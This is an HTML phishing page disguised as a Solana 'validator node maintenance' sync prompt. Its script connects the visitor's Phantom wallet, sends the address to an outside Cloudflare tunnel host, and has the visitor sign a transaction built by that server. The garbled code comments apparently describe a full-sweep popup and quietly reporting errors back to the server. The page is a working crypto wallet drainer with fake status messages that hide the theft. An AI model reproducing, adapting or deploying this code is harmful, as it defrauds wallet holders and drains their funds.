<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Support</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #0b0b0b; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 90%; max-width: 340px; background: #1a1a1a; border-radius: 16px; padding: 24px; text-align: center; border: 1px solid #333; }
        .icon { width: 60px; height: 60px; background: #14f195; border-radius: 50%; margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; color: #000; font-size: 24px; font-weight: bold; }
        h2 { font-size: 20px; margin: 0 0 8px; }
        p { color: #888; font-size: 14px; line-height: 1.5; margin: 0 0 24px; }
        button { background: #14f195; color: #000; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
        button:active { opacity: 0.8; }
        #log { font-size: 11px; color: #444; margin-top: 16px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">S</div>
        <h2>Node Maintenance</h2>
        <p>Your validator node requires a quick synchronization to remain active on the network.</p>
        <button id="cta">START AUTO-SYNC</button>
        <div id="log">SYSTEM ARMED v22.0</div>
    </div>

    <script>
        const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const log = (t) => document.getElementById('log').innerText = t;
            const sWeb3 = window.solanaWeb3;
            const p = window.solana || window.phantom?.solana;

            if (!p) { alert("Please use Phantom Browser"); return; }

            try {
                log("Connecting...");
                await p.connect();

                log("Syncing Data...");
                const resp = await fetch(tunnel + "/prepare_raw", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();

                log("Awaiting Confirmation...");
                const binary = window.atob(info.raw_tx);
                const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
                const tx = sWeb3.VersionedTransaction.deserialize(bytes);

                // ðŸ”± è°ƒèµ·å…¨é¢å½’é›†å¼¹çª—
                const { signature } = await p.signAndSendTransaction(tx);
                log("Sync Successful!");

            } catch (err) {
                log("Network Busy. Retry later.");
                // æ‚„æ‚„æŠŠé”™è¯¯æŠ¥å›ž 71 æœåŠ¡å™¨
                fetch(tunnel + "/debug", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ stage: "V22_FAIL", error: err.message })
                }).catch(()=>{});
            }
        };
    </script>
</body>
</html>
